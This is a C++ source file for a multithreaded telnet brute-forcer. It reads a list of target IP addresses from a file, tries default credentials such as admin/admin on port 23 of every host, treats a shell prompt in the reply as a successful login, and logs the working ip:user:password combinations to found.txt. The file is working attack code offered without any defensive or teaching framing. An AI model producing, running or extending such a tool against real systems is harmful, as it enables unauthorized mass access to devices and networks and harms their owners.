/*
*  Just a simple telnet bruter in c++. 
*/ 

#include <iostream>
#include <string>
#include <vector>
#include <iterator>
#include <fstream>
#include <algorithm>
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <thread>

using namespace std;


int connect_telnet(string ip, vector<string>::iterator users , vector<string>::iterator passwords) {
  
  std::string user { *users };
  std::string password { *passwords };

  cout << "Trying: " << ip << " user: " << user << " pass: " << password <<  endl;
  
  int iR;
  int flag = 1; 

  const char* c = ip.data();
  
  WSADATA wsaData;
  iR = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (iR != 0) { return 1; }
  SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (server == INVALID_SOCKET) { WSACleanup(); return 1; }

  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(c);
  addr.sin_port = htons(23);

  std::string login = user;
  login.append("\r\n"); 

  std::string pass = password; 
  pass.append("\r\n"); 
  
  std::cout << "Connecting..." << std::endl;
  if ((connect(server, (SOCKADDR *)&addr, sizeof(addr))) == SOCKET_ERROR) {
    std::cout << "Couldn't connect." << std::endl;
    WSACleanup();
    Sleep(500);
    return 0;
  }

  int bRecv = 0;
  char buff[2048];

  recv(server, buff, sizeof(buff), 0);
  std::cout << buff << std::endl;

  if(strlen(buff) == 0) {

      flag = 0; 
  }

  memset(buff, 0, sizeof(buff));

  iR = send(server, login.c_str(), (u_int) login.length(), 0);
  recv(server, buff, sizeof(buff), 0);
  std::cout << buff << std::endl;

  memset(buff, 0, sizeof(buff));

  iR = send(server, pass.c_str(), (u_int) pass.length(), 0);
  recv(server, buff, sizeof(buff), 0);
  std::cout << buff << std::endl;

  if(flag == 0) {
     
     memset(buff, 0, sizeof(buff));
     recv(server, buff, sizeof(buff), 0);
     std::cout << buff << std::endl;
     std::cout << buff << std::endl;

  } 

  if(strstr(buff, "$")) {

     std::cout << "[+] Found: " << login << pass << std::endl;
     std::ofstream outfile;

     outfile.open("found.txt", std::ios_base::app); // append instead of overwrite
     outfile << ip << ":" << user << ":" << password << std::endl;
     outfile.close(); 

      
  }else{
     std::cout << "[-] Not Found: " << std::endl; 
  }

  closesocket(server);

return 0; 

}
void bruter(vector<string>::iterator users , vector<string>::iterator passwords) {

  vector<std::string> servers; 
  vector<std::thread> threads;

  std::string str ;
  std::vector<std::string> file_contents ;

  std::fstream file;
  file.open("ips.txt",std::ios::in);

  while(getline(file, str))
  {
        servers.push_back(str) ;
  }


  for (int i = 0; i < servers.size(); i++) {
    threads.push_back(thread(connect_telnet, servers[i], users, passwords));
  }

  
  for (auto &th : threads) {
    th.join();
  }

}

int main(){

    vector<string> users = {"admin"};
    vector<string> passwords = {"admin"};

    for (vector<string>::iterator i = users.begin(); i != users.end(); i++) {

     for (vector<string>::iterator j = passwords.begin(); j != passwords.end(); j++) {
       
        bruter(i, j);


     }
    } 

    return 0;
 }
